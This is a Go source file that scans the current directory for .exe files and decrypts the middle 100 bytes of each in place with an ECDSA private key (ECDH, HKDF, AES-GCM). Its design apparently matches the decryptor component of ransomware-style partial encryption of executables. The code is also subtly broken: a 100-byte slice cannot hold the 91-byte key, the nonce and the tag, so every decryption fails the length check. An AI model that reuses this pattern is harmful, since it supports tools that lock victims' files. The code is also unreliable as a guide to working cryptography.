package dec_file

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/ecdsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/pem"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"

	"golang.org/x/crypto/hkdf"
)

const (
	FileExtension = ".exe"
)

func loadPrivateKey(path string) (*ecdsa.PrivateKey, error) {
	// Read private key file
	keyBytes, err := ioutil.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("failed to read private key file: %v", err)
	}

	// Decode PEM block
	block, _ := pem.Decode(keyBytes)
	if block == nil {
		return nil, fmt.Errorf("failed to decode PEM block")
	}

	// Parse ECDSA private key
	privateKey, err := x509.ParseECPrivateKey(block.Bytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse private key: %v", err)
	}

	return privateKey, nil
}

func EccDecrypt(cipherText []byte, privateKey *ecdsa.PrivateKey) ([]byte, error) {
	// Extract ephemeral public key (first 91 bytes for P256 curve)
	if len(cipherText) < 91 {
		return nil, fmt.Errorf("invalid ciphertext length")
	}

	ephemeralPubBytes := cipherText[:91]
	rest := cipherText[91:]

	// Parse ephemeral public key
	ephemeralPub, err := x509.ParsePKIXPublicKey(ephemeralPubBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse ephemeral public key: %v", err)
	}

	ephemeralECDSAPub, ok := ephemeralPub.(*ecdsa.PublicKey)
	if !ok {
		return nil, fmt.Errorf("not an ECDSA public key")
	}

	// Perform ECDH key exchange
	x, _ := privateKey.Curve.ScalarMult(ephemeralECDSAPub.X, ephemeralECDSAPub.Y, privateKey.D.Bytes())
	if x == nil {
		return nil, fmt.Errorf("failed to compute shared secret")
	}

	// Derive AES key using HKDF
	secret := x.Bytes()
	hash := sha256.New
	hkdf := hkdf.New(hash, secret, nil, nil)
	aesKey := make([]byte, 32) // AES-256
	if _, err := hkdf.Read(aesKey); err != nil {
		return nil, fmt.Errorf("failed to derive AES key: %v", err)
	}

	// Extract nonce and ciphertext
	block, err := aes.NewCipher(aesKey)
	if err != nil {
		return nil, fmt.Errorf("failed to create AES cipher: %v", err)
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, fmt.Errorf("failed to create GCM: %v", err)
	}

	nonceSize := gcm.NonceSize()
	if len(rest) < nonceSize {
		return nil, fmt.Errorf("invalid ciphertext length")
	}

	nonce := rest[:nonceSize]
	cipherData := rest[nonceSize:]

	// Decrypt with AES-GCM
	plainText, err := gcm.Open(nil, nonce, cipherData, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt: %v", err)
	}

	return plainText, nil
}

func DecryptFile(privateKeyPath string) error {
	// Load private key
	privateKey, err := loadPrivateKey(privateKeyPath)
	if err != nil {
		return fmt.Errorf("failed to load private key: %v", err)
	}

	// Open current directory
	dir, err := os.Getwd()
	if err != nil {
		return fmt.Errorf("failed to get current directory: %v", err)
	}

	// Find and process all .exe files
	files, err := ioutil.ReadDir(dir)
	if err != nil {
		return fmt.Errorf("failed to read directory: %v", err)
	}

	for _, file := range files {
		if filepath.Ext(file.Name()) == FileExtension {
			filePath := filepath.Join(dir, file.Name())

			// Read file contents
			fileContent, err := ioutil.ReadFile(filePath)
			if err != nil {
				fmt.Printf("Failed to read file: %s %v\n", filePath, err)
				continue
			}

			if len(fileContent) < 100 {
				fmt.Printf("File too small: %s\n", filePath)
				continue
			}

			// Get middle 100 bytes
			middleStart := len(fileContent)/2 - 50
			middleEnd := middleStart + 100
			middleContent := fileContent[middleStart:middleEnd]

			// Decrypt middle content
			decryptedMiddle, err := EccDecrypt(middleContent, privateKey)
			if err != nil {
				fmt.Printf("Failed to decrypt file: %s %v\n", filePath, err)
				continue
			}

			// Replace middle section with decrypted content
			copy(fileContent[middleStart:middleEnd], decryptedMiddle)

			// Write modified contents back
			err = ioutil.WriteFile(filePath, fileContent, 0644)
			if err != nil {
				fmt.Printf("Failed to write decrypted file: %s %v\n", filePath, err)
				continue
			}

			fmt.Printf("Successfully decrypted: %s\n", filePath)
		}
	}
	return nil
}
